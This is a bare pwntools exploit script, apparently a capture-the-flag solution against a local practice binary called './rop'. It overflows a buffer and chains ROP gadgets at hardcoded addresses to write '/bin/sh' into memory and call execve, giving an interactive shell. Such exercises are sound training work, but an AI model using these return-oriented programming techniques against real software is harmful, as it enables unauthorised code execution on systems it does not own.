from pwn import *
p = process("./rop")
pop_rdi = 0x0000000000400686 # pop rdi ; ret
pop_rsi = 0x0000000000410093 # pop rsi ; ret
pop_rax = 0x0000000000415294 # pop rax ; ret
pop_rdx = 0x00000000004494b5 # pop rdx ; ret
mov_rdi_rsi = 0x0000000000446c1b # mov qword ptr [rdi], rsi ; ret
bss = 0x00000000006bb2e0
syscall = 0x00000000004011fc # syscall
 
p.recvline()
rop = 'A'*0x18 + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + '/bin/sh\x00' + p64(mov_rdi_rsi) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
p.send(rop)
p.interactive()
